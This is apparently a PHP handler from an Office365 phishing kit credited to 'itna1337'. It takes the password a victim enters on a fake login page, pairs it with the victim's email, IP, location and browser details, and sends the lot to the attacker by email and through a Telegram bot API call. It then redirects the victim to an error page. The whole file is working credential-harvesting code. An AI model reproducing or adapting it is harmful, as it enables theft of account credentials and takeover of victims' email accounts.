<?php
session_start();
include('settings.php');
include('email.php');

# Fucntions

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   
    }else{
        echo header('HTTP/1.0 404 not found');
    }


$InfoDATE   = date("d-m-Y h:i:sa");
if(isset($_POST['password']) && $_POST['password']!='') {
    $message .= '
********** [ 🍁 Office365© | First Login 🍁 ] **********

[EMAIL ADDRESS] = '.$_SESSION['email'].'
[EMAIL PASSWORD] = '.$_POST['password'].'

';
$message .= "********** [ 🌐 BROWSER DETAILS 🌐 ] **********\n";
$message .= "# USERAGENT  : {$useragent}\n";
$message .= "# BROWSER    : {$browser}\n";
$message .= "# OS         : {$os}\n";
$message .= "********** [ 👤 VICTIM DETAILS 👤 ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "# CITY(IP)   : {$city}\n";
$message .= "# TIMEZONE   : {$timezone}, {$exact}\n";
$message .= "# COUNTRY    : {$countryname}, {$countrycode}\n";
$message .= "# DATE       : {$date}\n";
$message .= "********** [ 🍁 Coded By : itna1337 🍁 ] **********\n";


## Email Send ##
$subject = "ina1337 🍁 Office365© 🍁 First Login";
$headers = "From: $IP";
@mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );
header("location: ../error.php");
exit();
}
?>